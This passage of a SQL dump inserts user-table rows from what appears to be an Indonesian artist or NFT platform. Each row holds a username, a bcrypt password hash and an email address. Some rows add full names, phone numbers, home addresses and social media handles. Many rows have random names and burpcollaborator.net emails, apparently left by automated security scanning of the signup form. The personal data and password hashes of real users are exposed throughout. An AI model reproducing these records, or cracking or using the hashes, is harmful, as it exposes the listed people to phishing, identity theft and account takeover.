('kiranamariana8194', '$2y$10$a8ZaMI4DvAVimxdZVMURgee4A6.qcGvNDp2kf.u45OO0If7bPb99u', 'KADIYEM', 'zildalima321@gmail.com', '', '', 'Lain - Lain', '50516', '', '', '', 2, '', 0, ''),
('kiranamariana9356', '$2y$10$V77UWLTxONvE2qBKz0ZtVejPQmkMCXD5UOs8Fs2ugACQDzuMVHvbW', 'SUNARDI', 'ninamariaaldenice28@gmail.com', '', '', 'Lain - Lain', '21717', '', '', '', 2, '', 0, ''),
('kiranamariana9526', '$2y$10$IgJF8.rQm24oj2hbqrK13Og184Uvhmb3uSiSlhj9hdQ/FdmdAO//6', 'SAMIKEM', 'tonny-l@hotmail.com', '', '', 'Lain - Lain', '9475', '', '', '', 2, '', 0, ''),
('kiranamariana9568', '$2y$10$AOpiqTxrMFQnMP1qo7RoV.KQpXYazc7YfBIXEyvIApuIeS.KahbOa', 'DARNI', 'eddypaixao93@gmail.com', '', '', 'Lain - Lain', '7881', '', '', '', 2, '', 0, ''),
('KtQljFOv', '$2y$10$cH6Pgs5aZVo6K0dv3AMa2.xEYaD4T2JsRvyJ9L.n3Ih/aNQ9k3VfG', 'BTECMkWD', 'AEZyLJfe@burpcollaborator.net', '', '', '', '67869', '', '', '', 2, '', 0, ''),
('kuyow13x', '$2y$10$Hr4Dee/XKhr.xWjbwfzeIODrBO56fbX./BVji0nq/njR7a2.kvbqm', 'RAMDANI', 'kuyow13x@gmail.com', '', '', '2D', '21049', '', '', '', 2, '', 0, ''),
('lalamarianti4332', '$2y$10$/C9PrEC6i.H/pp8fNULrWuxOO0MmcTXRWQddQrV2DqBpuAbAaIBgu', 'DHONI ABDUL WAHID', 'marciavendramini@live.com', '', '', 'Lain - Lain', '78565', '', '', '', 2, '', 0, ''),
('larasatikurnia2166', '$2y$10$UOoPYXwMSb1WwC3O7mpSiO/XUzls/gVDtw3dcAKzYJMVrs9bbvuUi', 'WAKIDI', 'morenoleidy279@gmail.com', '', '', 'Lain - Lain', '12061', '', '', '', 2, '', 0, ''),
('larasatikurnia2228', '$2y$10$yL5zJSgGar/534JEPiquwe/VdSqjfjkxO8IF3IIkkLpj2Or3V8CyC', 'HARYANTI', 'genisesduate@gmail.com', '', '', 'Lain - Lain', '72890', '', '', '', 2, '', 0, ''),
('larasatikurnia8290', '$2y$10$aG5QB2i3YrKbD8nyma03AO2NxYoSeVmyU7BqIjiO8i/MKfcn5Wtsm', 'BEGEN POYO PUTRO', 'hnmh3114@gmail.com', '', '', 'Lain - Lain', '5004', '', '', '', 2, '', 0, ''),
('LfgmlWSb', '$2y$10$Vc/87H6ScsZykDiQVoX6FOHrHC3HV/N4f3WnRF6.CEpE.dxBWvxw6', 'siWVMJrx', 'erzjxrWV@burpcollaborator.net', '', '', '2D', '73234', '', '', '', 2, '', 0, ''),
('liaarnita322', '$2y$10$mNltDHYF3S1UqrAcOGtLROes56XC01CjcHIANcTxNlZkInqO.9Tsu', 'RATNA KUMALASARI', 'rodolfomedina24@hotmail.com', '', '', 'Lain - Lain', '98687', '', '', '', 2, '', 0, ''),
('liaarnita3811', '$2y$10$c4IK1u4cPqDEyjE.QpevD.qJvo6eUM6ASFcATPNYz0sH5Lt.I1Bhu', 'AQUEENA NASYITHA ISWARA', 'danubia.lopes81@yahoo.com.br', '', '', 'Lain - Lain', '24551', '', '', '', 2, '', 0, ''),
('liaarnita6764', '$2y$10$/Wr6mYGujlib/YNgj958See6FQXKa2gLxlq0.mBDIykHgJGrQ3QcC', 'LARAS SARI PUSPITA', 'shirleygmonteiro91@gmail.com', '', '', 'Lain - Lain', '94627', '', '', '', 2, '', 0, ''),
('liaarnita8234', '$2y$10$s5LedbYoPTUMk2KjdpxQMOomgFmHGPNA/9Tull6OrbgqN58nYaPyq', 'YUDI GUNTORO', 'marinalda.clementino@gmail.com', '', '', 'Lain - Lain', '32298', '', '', '', 2, '', 0, ''),
('lianadinianti4993', '$2y$10$RIj1BHZB0qcAEoHVu14me.EJAFQslrVGooq6XzdIOie9wIiReOIAm', 'AGUS SUSANTO', 'ivaniaacorrea@gmail.commarro', '', '', 'Lain - Lain', '12078', '', '', '', 2, '', 0, ''),
('lianaputri3351', '$2y$10$L9KSBHOCxKUBB2rkTVgBQ.CYbF3LKr9b0.ODe0wZb2Evtv8R7VGPS', 'SUPRIYADI', 'paulohairpaulo@gmailcom', '', '', 'Lain - Lain', '54557', '', '', '', 2, '', 0, ''),
('lianaputrianda7741', '$2y$10$HdAIO.nmDBKxELjJP00j9udBUc2m0x1A1Rlp4gp8rm01dlFy1UyhO', 'MULYATI', 'iandrabeely@gmail.com', '', '', 'Lain - Lain', '30162', '', '', '', 2, '', 0, ''),
('lianaputrianda9964', '$2y$10$8Z3kc7odl8WNumG/pVQXy./H0uQCoj/6ltEp/S/PtMn.AvJzwzjKe', 'JAINO', 'cristianefernandes070@gmail.com', '', '', 'Lain - Lain', '26374', '', '', '', 2, '', 0, ''),
('lianaputrianda9968', '$2y$10$goMOQWPJUrp3qFZJe4PDye7nZn.JZRXDaZ1ahY3nNDpsBcABSYklW', 'AGAM ABDILAH PRATAMA', 'cel-oliveira@hotmail.com', '', '', 'Lain - Lain', '56787', '', '', '', 2, '', 0, ''),
('liandawirayuni167', '$2y$10$JYB1m9upIBzPbjUmZkgWyeCrKTgODG6wcEcoxtiD8Jk1ypkrDTYNO', 'TIARA SARI PUSPITA', 'lulu__nobre@hotmail.com', '', '', 'Lain - Lain', '62615', '', '', '', 2, '', 0, ''),
('liandawirayuni97', '$2y$10$/jUrXpxxRTt6Jj7ubiQIQ.X.mJmWiwGFDnM/fNNQGtnk45o/ywOeO', 'RIKANANDA PUSPITASARI', 'mariadocecharmeesmaltaria@hotmail.com', '', '', 'Lain - Lain', '41629', '', '', '', 2, '', 0, ''),
('liaparamitha5473', '$2y$10$xwogpFpPrGs80nsG9OG94.LunB.f8mknG.kpv278sxNNucSQSpvXW', 'SARMIN', 'daianaabsc@gmail.com', '', '', 'Lain - Lain', '50166', '', '', '', 2, '', 0, ''),
('liaparamitha5529', '$2y$10$9xgcjUH6SikJjDH1lcOQh.53rAFKFwqKX79ful3KTr6RYnaIb1SEC', 'HARTANTO', 'alanagubert@outlook.com.br', '', '', 'Lain - Lain', '49458', '', '', '', 2, '', 0, ''),
('liaparamitha7630', '$2y$10$z5Aj1ikMeXlGl4ReV4TtRe17o/Kw4OavC9I2EeA5JK/f.ZopKandC', 'LASTONO', 'alisson_teis@hotmail.com', '', '', 'Lain - Lain', '73428', '', '', '', 2, '', 0, ''),
('liaputria1439', '$2y$10$ETTi6HhxJSjIbwm7X581l.W4qfkMuM0fWcH7hXe7AsiwES/5169Y2', 'MENTOWIYONO', 'ivannsmn@hotmail.com', '', '', 'Lain - Lain', '72580', '', '', '', 2, '', 0, ''),
('liaputria8433', '$2y$10$7RSkBhNKw70TL/XtLZNEw.2L19gIfd07YXt20CTuJNu9V/Tcua6S6', 'SAMIYEM', 'maria.sosilva8@gmail.com', '', '', 'Lain - Lain', '30407', '', '', '', 2, '', 0, ''),
('liariana8860', '$2y$10$WxpZqOp4ggIrNbZPhzQav.mik6UGN55z1x44gauC.WrXUJc4WN5Oi', 'SURATNO', 'abech339@hotmail.com', '', '', 'Lain - Lain', '32732', '', '', '', 2, '', 0, ''),
('liayuninda2348', '$2y$10$0xMFqPhuxgsuDMXh5CoK5OqFZDs3pjjXrm7303Il9HbNOlDkJgZXa', 'SETIYAWAN S.SOS', 'abel.fidel2016@gmail.com', '', '', 'Lain - Lain', '35420', '', '', '', 2, '', 0, ''),
('lidiafatmawati9210', '$2y$10$iVPId6cfax8T/gCG1N0D1utHTi6HjJVM8wrqp75xBmfuaL0v8Tl2m', 'SRI DWI LESTARI', 'daviiidsantiago@ocloud.com', '', '', 'Lain - Lain', '60911', '', '', '', 2, '', 0, ''),
('lidiaputri9928', '$2y$10$s2vKI/pj3YeYuuxRDqb7mOQWbEko68kYKdSJ/.7K5Hk06cMER8Li6', 'WARINEM', 'lelesjoaovictor@gmail.com', '', '', 'Lain - Lain', '922', '', '', '', 2, '', 0, ''),
('lidiareniani6777', '$2y$10$BSK0oxd8AQaR00vIpj7GA.6YaOYigkN74vWJBP9dD4mPLJqA3iale', 'SATIMAN MANTO KARSONO', 'daniavictorino0@gmail.com', '', '', 'Lain - Lain', '99318', '', '', '', 2, '', 0, ''),
('lidiareniani9966', '$2y$10$yx5GVC/MqHHolE/NxW3SIedojd28SIty1r5qyLn1MjNcqfGGMeOsq', 'MARIKEM', 'Lilian_cnp@hotmail.com', '', '', 'Lain - Lain', '35699', '', '', '', 2, '', 0, ''),
('lilianafitriana2296', '$2y$10$rPyxbxF.pGcGVUPS1JQNsuAFF0fNQlZ85afLDoJ..SwK5oh41GbVi', 'JUMADI', 'guimendes92@icloud.com', '', '', 'Lain - Lain', '12116', '', '', '', 2, '', 0, ''),
('lilianafitriana2632', '$2y$10$6W6k4Sfp1EMHT9lQmOFBHOGy82hF.OTN0tVI6vfRGN3j6FtlX2GRK', 'BIMA WAHYU RAMADHAN', 'esterroque199@gmail.com', '', '', 'Lain - Lain', '81425', '', '', '', 2, '', 0, ''),
('lilianafitriana4988', '$2y$10$8BmUJNAMiPhCgrY0CsdIfOEjWupVehtSSntdmpYNv/MPG7bsERvW6', 'SULISTYOWATI', 'Mirian_vf@hotmail.com', '', '', 'Lain - Lain', '60259', '', '', '', 2, '', 0, ''),
('lilianafitriana7855', '$2y$10$mUL6wlOCuHOvld7x5raSs.vpQbnjJpyg4KdkO.NCuADGGGwShGesW', 'PURYANTO', 'fernandokley@hotmail.com', '', '', 'Lain - Lain', '30354', '', '', '', 2, '', 0, ''),
('liliandaputri4249', '$2y$10$YjJRtoFDIKmgY7x2i..Z1eWymq/qJ3MEmYPcqx3j1dgNWBuh56eum', 'PUTRI PUSPITASARI', 'edivane.juan@outlook.com', '', '', 'Lain - Lain', '36155', '', '', '', 2, '', 0, ''),
('liliandaputri5343', '$2y$10$RsXx8WHULd9DOYw.exub9OYG2.u81sHkd.oLihHYDCfPSlkOaCvaK', 'PUJIYANTO', 'Juniorgatao74@gmail.com', '', '', 'Lain - Lain', '94633', '', '', '', 2, '', 0, ''),
('liliandaputri6060', '$2y$10$BdUg6dcxYDZmJ3D507sdveTOQncQlRwgTtGiYyt1wBcsY9xu5xGCm', 'ENDRI YANI LESTARI', 'tamara100gata@hotmail.com', '', '', 'Lain - Lain', '87105', '', '', '', 2, '', 0, ''),
('lilysaruksuk9441', '$2y$10$Vw/1LZuzewh3pkmBxtWkHOAyV46CkNiYDLOdKnOPrQpLpmSKh7AiO', 'SITI SOLEHA', 'fabiolacamposstudio@gmail.com', '', '', 'Lain - Lain', '11122', '', '', '', 2, '', 0, ''),
('lilysipanggang', '$2y$10$eogmduZDKogwnhGTXKSbiOu7f9ojHQ4jRSs3Qo6rLGyAQ7ZMCK9MO', 'AGUSTIN PUTRI EDELWEIS', 'rayanesantosatelier@gmail.com', '', '', 'Lain - Lain', '53266', '', '', '', 2, '', 0, ''),
('linalidia7181', '$2y$10$3pzybaDwYkblR8azip5yiegqfCP9zxpyv2NhiB5LOv5dofWRN23Mq', 'TRI WINARNI', 'danidiaas0202@gmail.com', '', '', 'Lain - Lain', '2677', '', '', '', 2, '', 0, ''),
('linalidia7517', '$2y$10$x52/u3vqm..3Op8zc.jI.OiBfFEkchK3gBRcrrontmeIVHVUKeYEu', 'GILANG HUSADA', 'ferreiradesouzaj6@gmail.com', '', '', 'Lain - Lain', '75371', '', '', '', 2, '', 0, ''),
('linamariana9736', '$2y$10$ILrHY5erqOvJXV7LpMFvY.TUwIVJZ/OPnCbqz3QtVU6raHH2OMbSq', 'KARNI', 'gilmatosmiranda@gmail.com', '', '', 'Lain - Lain', '93196', '', '', '', 2, '', 0, ''),
('linamarliana8491', '$2y$10$Sas6AznZo5JBAatbOG0rRuwSik2/QDM4pIZZg9T7wEnB/CUxwuHSW', 'SRI HARTINI', 'thaispollyana22@gmail.com', '', '', 'Lain - Lain', '95689', '', '', '', 2, '', 0, ''),
('lindafaradina8673', '$2y$10$d423TSR.zR2JXYoFLWWFvOAasnisTpvI5LIgoRGqCEVk9Hi9VmD56', 'PADANG SAPUTRO', 'wignatorres@hotmail.com', '', '', 'Lain - Lain', '36777', '', '', '', 2, '', 0, ''),
('lindamarinda3308', '$2y$10$oEyClDmOsGTslmW3QXZvc.u.7/KJQlzvrFEcN2lNhgBVWn9T3yIDK', 'LISTYO TITIK PURWANTI', 'marinacslima@yahoo.com.br', '', '', 'Lain - Lain', '19219', '', '', '', 2, '', 0, ''),
('lindamarinda4207', '$2y$10$UiGdbO9gMF2YVgUPncN.sevbhopi/lZnVyjNsDUJCGPiVBczVNw1W', 'AKISCA MUHAMMAD S', 'joanaazevedodepaulo@gmail.com', '', '', 'Lain - Lain', '43292', '', '', '', 2, '', 0, ''),
('lindamarinda9694', '$2y$10$.IuDW9pQNUku7sXNvRKiQetc3kjCGnZl30LQsJPLCm5r74Ax4BCjG', 'WARINO', 'Jujuefran77@gmail.com', '', '', 'Lain - Lain', '51423', '', '', '', 2, '', 0, ''),
('lindamarliana4567', '$2y$10$4MBmSjMQEgEAMfnMC3al7eWD6/38xZ9JvmenBR1GHyZ2O6CsdQVzO', 'MUHAMAD KAFANAL KAFI AL KARIM', 'michelbh2690@gmail.com', '', '', 'Lain - Lain', '62772', '', '', '', 2, '', 0, ''),
('lisayulianti5493', '$2y$10$sJQk1ipa15tMXZpDITBgCeE1UYCWeVo3Ks4G/vtz/AwSxJSn2o58u', 'YUNITA KURNIAWATI', 'michellyandrade2405@gmail.com', '', '', 'Lain - Lain', '78806', '', '', '', 2, '', 0, ''),
('lismadestriana1080', '$2y$10$5HYPTV00brnIn9.UyOLRQ.ugOhC42fKaQTjphHTd1e9f2.YIEpi.2', 'MARYATI', 'IZAKALORE@GMAIL.COM', '', '', 'Lain - Lain', '36881', '', '', '', 2, '', 0, ''),
('lismadestriana8175', '$2y$10$iUyoL.DGHFOz3tbbWSyGWulXsfW2uwipU7HEnnBwR9ULE7zjABeEe', 'SURYADI', 'simoneperes1106@hotmail.com', '', '', 'Lain - Lain', '68521', '', '', '', 2, '', 0, ''),
('lismadestriana8189', '$2y$10$PIxfWGPZPdp0vYyPQeX0QuS4zc.32rBn45FQDhPidD.EwVlD2Ni3G', 'FREDI SULARTO', 'elizabeteandrade.flo@gmail.com', '', '', 'Lain - Lain', '48700', '', '', '', 2, '', 0, ''),
('lismadestriana8904', '$2y$10$.zKyvWQn8WIf0h274OTEAO/JxwcaUwIc50mCp3NfqWbNq3ApocvUy', 'SUKARDI', 'williantoon@yahoo.com.br', '', '', 'Lain - Lain', '99500', '', '', '', 2, '', 0, ''),
('lismayuliana2979', '$2y$10$TdbBkZW63ORV3y7dquv/aOS/HxHm8xYMYz9gNnrUsQ/.e893Z0DpC', 'SAKIYEM', 'esteticamateuslima@gmail.com', '', '', 'Lain - Lain', '8467', '', '', '', 2, '', 0, ''),
('lismayuliana3611', '$2y$10$ohl171MIJ.jfrbka61mjUO2qRfR86pht9iJX6lVILZZP6VwpIZIXO', 'WELASIH', 'tatinha_carol@hotmail.com', '', '', 'Lain - Lain', '7269', '', '', '', 2, '', 0, ''),
('lismayuliana7420', '$2y$10$mo67WJTBrYEpp4VsRKoOEuPV5aY/9m7sYeQMLFr71VBYJAfgs5rzu', 'SADIRAN', 'nadja_oliveira.souza@hotmail.com', '', '', 'Lain - Lain', '63182', '', '', '', 2, '', 0, ''),
('LIxkBKRn', '$2y$10$Jws8H8zhBzbVciUv5ReL2uWgoyKc4urZk7.bYbVLq8oaxqlHrc2xW', 'UBTwQetr', 'JZAcsPDM@burpcollaborator.net', '', '', '', '26354', '', '', '', 2, '', 0, ''),
('LJjYaCho', '$2y$10$p4TAwK.oC1K9YrVcmRp0B.dyN1G4dmtQuM3pON55pXLJyxyv9q3pu', 'omPgTtKL', 'LLwuQOiX@burpcollaborator.net', '', '', '3D', '24328', '', '', '', 2, '', 0, ''),
('lnVcsiHD', '$2y$10$kX3DR5MVuqQHnJAIMa4xcOSA1X4Q2FGxcxZb7UR7kJLaj6P9iG3kG', 'cdYspyJm', 'cKnWyxMT@burpcollaborator.net', '', '', 'Lain - Lain', '40005', '', '', '', 2, '', 0, ''),
('Lotus', '$2y$10$aC1D.QEJYA6lixAnxidW2Oz2U3umFr5PdopuYRRKOdJa3OD9r6EsC', 'Ari Kurniawan Ramadhan', 'arir4madhan@gmail.com', '', '', '2D', '90450', '', '', '', 2, '', 0, ''),
('lydiaakarbejadi1817', '$2y$10$qfkqGtNyt1a9SuFZiC.4jO7R3rAWXB.pTldKn/qhh2rBYH/LwHVey', 'SUKINO', 'glauciabarroso27@gmail.com', '', '', 'Lain - Lain', '97441', '', '', '', 2, '', 0, ''),
('m.rp.m', '$2y$10$dYDB44uvNlLMGSg5.BRmB.X39Nl45VDRoWLnh6MpmM5B.WS9cuRQ2', 'Muhammad Rifqi Putra Manaf', 'mrifqiputram@gmail.com', '', 'Karawang', '3D', '80788', 'https://www.instagram.com/m.rp.m/', 'https://twitter.com/mrpmmrpm', '', 2, '', 0, ''),
('marikelessy', '$2y$10$Y7C4CiWYpcS2e6/ma3UsAemn4R6m19FuJcu6NCOQptLwYrhDDYhNG', 'SRI LESTARI', 'ester_annaeriky@outlook.com', '', '', 'Lain - Lain', '64041', '', '', '', 2, '', 0, ''),
('maullidianta', '$2y$10$NAL9YtR9zrzRDKuzmMplD.EEAwI2GcxOVrj9YSo.1F26oAcbsnrd6', 'Maulidianta Zuhdan', 'maulidiantazuhdan03@gmail.com', '081380356050', 'Malang', '2D', '55438', 'https://www.instagram.com/maulidianta/', 'https://twitter.com/mavlidianta', '', 2, '', 0, ''),
('mercyhulu7', '$2y$10$5dNMBfpX7tkUVQT2TItvA.Ru8jlKyRsRAxWl0Ru8iYWsSa/NxQ5zy', 'SRI WIDAYANTI', 'ste_graycepl@hotmail.com', '', '', 'Lain - Lain', '33866', '', '', '', 2, '', 0, ''),
('MGNTORO', '$2y$10$Yv6MjKQ6CtOEhTEPFIj5peO94ut0l8uxzB.xw0CI6gc4k690LLHtq', 'Megantoro', 'mgndwp@gmail.com', '', '', '2D', '37997', 'megantoro_dwp', '', '', 2, '', 0, ''),
('miramarina8122', '$2y$10$ACgK.3LH4oUsxn3bkPNm8uKm.t.SaHyU/BFnDOq.ocaURuPBRF5P6', 'EKO SANTOSO', 'bernadeteflavia5@gmail.com', '', '', 'Lain - Lain', '68751', '', '', '', 2, '', 0, ''),
('miravebriana8525', '$2y$10$dSNraCKY20/8ctxB.buSSOrnTlHCXAKYYp747WPZYeVjTmj6WBmne', 'NUR FEBRIA BUDI LESTARI', 'eduarda-arrais@hotmail.com', '', '', 'Lain - Lain', '6506', '', '', '', 2, '', 0, ''),
('moh.edgar', '$2y$10$ERM0S0W/Xz0MDJB9/ejTn.B03s0I30POD2Ua9/4H.u68yYUFTgQ.u', 'Mohammad Edgar', 'mohamamdedgar99@gmail.com', '087730301117', 'jl. peritis Kemerdekaan gang23/ No. 15', 'Motion', '64166', '', '', '', 2, '', 0, ''),
('MOVnTTow', '$2y$10$c2zW14JJUdPgszIr0q1IA./3epM1.ngZ4Ps60bKZL2S8T2Wd0IT5C', 'dkltGDhi', 'OtajyRSn@burpcollaborator.net', '', '', '', '55703', '', '', '', 2, '', 0, ''),
('MYJWGxKa', '$2y$10$k0E7PDtyHicsVhpFrG.goeBqPfsH/XD.a2cmPqipW6e3.FBy7hOMa', 'acGUxgDf', 'TUpBNRqZ@burpcollaborator.net', '', '', '', '28462', '', '', '', 2, '', 0, ''),
('naaaatrium', '$2y$10$K/Y/Tav1K2OpLz1tgEeoQeAIHNJs.LJIoWwa9tTu7H74qD/Tj3f2W', 'Nathanael picauly', 'nathanpicauly18@gmail.com', '083125325288', 'Kerinci sungai penuh', '2D', '14515', 'naaaatrium', '', '', 2, '', 0, ''),
('nama', '$2y$10$eyXARmWXstDbGuSn14mh6eAEjdev4/yb6rqBfJER9Ksv3byyrcO/m', 'nama', 'test@gmail.com', '', '', '2D', '43955', '', '', '', 2, '', 0, '1636959294'),
('NbssOirJ', '$2y$10$BCuWYXvwRe9nFlk4kmiS0e2O2m6DHoNjpeqMw19PppsrkOlUgqRVC', 'NhGisKcc', 'UNXcwIIB@burpcollaborator.net', '', '', '', '71274', '', '', '', 2, '', 0, ''),
('nGezCBZV', '$2y$10$SciecRYilzkt.Gkb0d2YEOxzrWrAptIUFKQSJqN9QMY/9F77Cmc0m', 'IoQmynQz', 'mMryfQQv@burpcollaborator.net', '', '', '', '81898', '', '', '', 2, '', 0, ''),
('niamarinda7332', '$2y$10$awYqcJgvWcNP94biihH12.IHGDG2BACXK.WDP.1EpBVBkDrkA62oG', 'SANI', 'regianegabrielgiovanna@gmail.com', '', '', 'Lain - Lain', '85153', '', '', '', 2, '', 0, ''),
('niarahmwati1618', '$2y$10$WN0fYqUU4XI/laCupBZxX.v9j48bvKZd/VylPOuOCFuMGyRjr6xe.', 'NURUL EMILIA AGUS SETYANINGRUM', 'maricolpo20@gmail.com', '', '', 'Lain - Lain', '67928', '', '', '', 2, '', 0, ''),
('niarahmwati5677', '$2y$10$/HW7RI8zFQkcgAxB7hg5XOVuiSZ1kAiIXO836ORR3OHQJ9dkCCA.G', 'ANISA FATU KARIMAH', 'gracya_@hotmail.com', '', '', 'Lain - Lain', '48451', '', '', '', 2, '', 0, ''),
('niarahmwati7491', '$2y$10$iAmcRy9jMEoxlOST4MZa9e.ByvFcjRkiqfhOiOh3CUIf5yrrckWU.', 'GADING FAHREZA H', 'adriana.machado56@gmail.com', '', '', 'Lain - Lain', '46007', '', '', '', 2, '', 0, ''),
('niarahmwati9409', '$2y$10$4LHnITlpGLA3m/XZ48wnCOmLhBlFDVimlTje2wbTxezdm6VnNxMae', 'ARDIYANSYAH SURYA NUGROHO', 'clotilde.cortez@hotmail.com', '', '', 'Lain - Lain', '14753', '', '', '', 2, '', 0, ''),
('nidhaariana2357', '$2y$10$iPjiwqPZCEai/7A0jlY/J.d5g466lPL8ABiYs6K3Dj9I5c.8FBeh6', 'SUMARMI', 'robsonrpd@yahoo.com.br', '', '', 'Lain - Lain', '77713', '', '', '', 2, '', 0, ''),
('ninamariana5857', '$2y$10$Wp8UDX/0mAu0XMnVkLmNUOjzKMtw/QyIFVzRwnUVk8sBaErZ7bwbu', 'DWI FITRIYANTO', 'ro.koball@hotmail.com', '', '', 'Lain - Lain', '19432', '', '', '', 2, '', 0, ''),
('ninamariana7259', '$2y$10$/3fgEv3iL8tkGQN9UXLjN.77tQ9FyLWRnvD1gO1NL43XRjGfGh9Je', 'RIKA MAHARANI', 'lezainaferreira@gmail.com', '', '', 'Lain - Lain', '69054', '', '', '', 2, '', 0, ''),
('ninariana3776', '$2y$10$1RjAl.N562CL/AvTnZtHEeUMjr4z9kMh.4ixPjcqezm3HrryJzfUG', 'SRI PURWANTI', 'mikarla.hair@gmail.com', '', '', 'Lain - Lain', '39066', '', '', '', 2, '', 0, ''),
('ninariana5021', '$2y$10$LMuWJ/r1H809R6gMUUyqt.MP9luafbrvUlyTPiRE2QFvJGA7dFtjO', 'SUYARTI', 'zilenemelo17@gmail.com', '', '', 'Lain - Lain', '73321', '', '', '', 2, '', 0, ''),
('ninariana5681', '$2y$10$s7mT9Tqgc0VhZfsrWeIRw.SEc1ZTXjxjqvQ7gLEcq0bmlZQPhg0ju', 'TARTI', 'ribeirovinii@gmail.com', '', '', 'Lain - Lain', '64030', '', '', '', 2, '', 0, ''),
('ninariana9506', '$2y$10$k.LC9tp6ynecwyugupkl0.ZqW2CcWAqD06t6qxPI8gJibA0ZhYuWS', 'WIRYOWIYONO', 'mssueliviola54@gmail.com', '', '', 'Lain - Lain', '17482', '', '', '', 0, '', 0, ''),
('ninayuriska8942', '$2y$10$Ep9z1hSEXWtKFyuousnRtOVJq/S60MyzhrkeQ8fO38max62zvvNia', 'SUWONDO', 'Maayaaraassis@gmail.com', '', '', 'Lain - Lain', '71302', '', '', '', 2, '', 0, ''),
('nirmalarahmawati363', '$2y$10$cd6ryXRc0v8X3A9zfFLjYepFgPgQ6d02TgDcPfovS11LUJO53pyd.', 'MURYADI', 'edineidegomes.batista@gmail.com', '', '', 'Lain - Lain', '73632', '', '', '', 2, '', 0, ''),
('nirmalarahmawati415', '$2y$10$1HcKlIaH8uJkYrWd6BltZ.T.p8/8QgSIrWjQWjc.RQ32bV8m2JGXS', 'SANTI', 'deuzafarias25@gemail.com', '', '', 'Lain - Lain', '85065', '', '', '', 2, '', 0, ''),
('nirmalarahmawati9642', '$2y$10$iLGsK2mLFtBy7dYhlnAwb.NmBZwjzSsDHKd/i0GcbG26iEWJSPVda', 'RIYEM', 'mariaedilza268@gmail.com', '', '', 'Lain - Lain', '97156', '', '', '', 2, '', 0, ''),
('nirmalayulianda9703', '$2y$10$ROjsz6JyJ7y8fcCEEaTwmeZydyqqvsaOMisuHAC17XLJvs3hDGe8u', 'SUNARTI', 'darcicleide.alves1234paulo@gmail.com', '', '', 'Lain - Lain', '70082', '', '', '', 2, '', 0, ''),
('NKjMYXvc', '$2y$10$9c9P/2pCffD1acqaOOTRK..oG9Q1VFaB4JkGB3GXYJAzjS8ct4EDG', 'TDZBHhzd', 'Xlcjaaet@burpcollaborator.net', '', '', '', '67615', '', '', '', 2, '', 0, '');
INSERT INTO `user` (`username`, `password`, `nama`, `email`, `phone`, `alamat`, `aliran_seni`, `idnft`, `instagram`, `twitter`, `facebook`, `role`, `dp`, `is_active`, `date_created`) VALUES
('ObZcWvqX', '$2y$10$cIzD7e755ThMNy3x6948X.292b2FRj7WbXRleI5kUdiUQUpP6dazm', 'XrUiiBda', 'QZDjRScC@burpcollaborator.net', '', '', '', '25455', '', '', '', 2, '', 0, ''),
('Ongs__', '$2y$10$oiB1h8T/U8bZMWnCtVY/2eMI0W6Iid2fbaZrA0K7/pmsPs1LewNsK', 'Ongs', 'ongsss378@gmail.com', '0895635747379', '', '2D', '31737', 'ongs__', '', '', 2, '', 0, ''),
('OqvhswFh', '$2y$10$/lF2cLujh8QdymtuCabxb.UbcmXRvDNsLxNxJhrzuYKnafMcu1Tba', 'GvtTZsoB', 'jDFzBdSu@burpcollaborator.net', '', '', '', '39252', '', '', '', 2, '', 0, ''),
('PeCcswQo', '$2y$10$eZ7Agn/ZHwZAyn.rgMsUBe.LoZTQ8TIZeQ7U995eKR0iknq1SUyRu', 'DVAyPcjT', 'zBspVODO@burpcollaborator.net', '', '', '', '6793', '', '', '', 2, '', 0, ''),
('peweilustrator', '$2y$10$Zph/JKgYGPRAag9qGiT7xuEfAjWc2s.zBgKlZP6kaWwVWJlFDwG6e', 'Pewe', 'pewe.ilustrator@gmail.com', '083898636250', 'jlan kh mansyur gang mess kelurahan tanah abang jakarta pusat', '2D', '36522', 'pewe.ilustrator', '', '', 2, '', 0, ''),
('pgVyBGXV', '$2y$10$ldnutXg0pqMQH2/XY0w1vO047HwUWpok2jeV9quWQhVi/gwLq8oJS', 'zIsPskrj', 'iUwjmSKh@burpcollaborator.net', '', '', '', '22318', '', '', '', 2, '', 0, ''),
('phoebesimanungkalit3206', '$2y$10$FWqJhFn6iHlI2ju0vu2RZOX0Mcic35dSyHsf5ROy4Luc1BEvdBooG', 'MARYANI S', 'anvsantiago@gmail.com', '', '', 'Lain - Lain', '52859', '', '', '', 2, '', 0, ''),
('pnRCECfa', '$2y$10$FkZEa5RzZe44bB.o0Lw7EeE.u/vD.W86/pVdKk6lkyxUOZtFeUWf.', 'QJnOeZgJ', 'zwfUzlnT@burpcollaborator.net', '', '', '', '22548', '', '', '', 2, '', 0, ''),
('PPuBAwFt', '$2y$10$1RpLVnUbIDA59PNN/yZ3fOtdLL1RQDZIH2yenGGMDeACVDfghUoGC', 'InyPeBck', 'aAmaPnxy@burpcollaborator.net', '', '', '', '84406', '', '', '', 2, '', 0, ''),
('puBklMcY', '$2y$10$V28.yBvOGBf2Zft3L3JLjuxV4ACl8iisp.ZDDELM0zXLF0a8T5h16', 'BEbTkMre', 'tunQRbpG@burpcollaborator.net', '', '', '', '81448', '', '', '', 2, '', 0, ''),
('puputunjayatina1300', '$2y$10$6BaC4J1i/ZLJJ5VSZbEbv.GfnD2WisV.yd1n3upTwRQ6QAzRoqbfe', 'MARNI', 'Ivaneidesantosilva65@gmail.com', '', '', 'Lain - Lain', '49373', '', '', '', 2, '', 0, ''),
('PUszbsJD', '$2y$10$mUilcW0kFDxtb1QwC4E36eLjyYkS5b.fC/X/T2PuyBXcU93YFhgKS', 'GYQqDlRK', 'WoAjvsXx@burpcollaborator.net', '', '', '2D', '35869', '', '', '', 2, '', 0, ''),
('Putramatahari28', '$2y$10$tX54VUHKdzHBBGEuERFsgOYiZsXm3pKZdfsGRov8fjoK6.zKIyHxe', 'Agung Atmaja', 'masmodjoo@gmail.com', '082169823455', 'Jakarta, Indonesia', '2D', '6168', 'masmodjo', 'masmodjoo', '', 2, '', 0, ''),
('putridwiyanti9989', '$2y$10$pFiPDXbf2tAl9jJApOdJw.JPwh7lgRCxBMxAsgGuxmcX03thfCndC', 'SUTARDI', 'fabisantana180879@gmail.com', '', '', 'Lain - Lain', '57899', '', '', '', 2, '', 0, ''),
('putrierviana1243', '$2y$10$RCTWf2XnXn17IUyHNPqC3O.XzuaAKK34AKI.1UIYXLL4zY7cDQjsy', 'AMIR UDIN', 'luzienesilva32@gmail.com', '', '', 'Lain - Lain', '17163', '', '', '', 2, '', 0, ''),
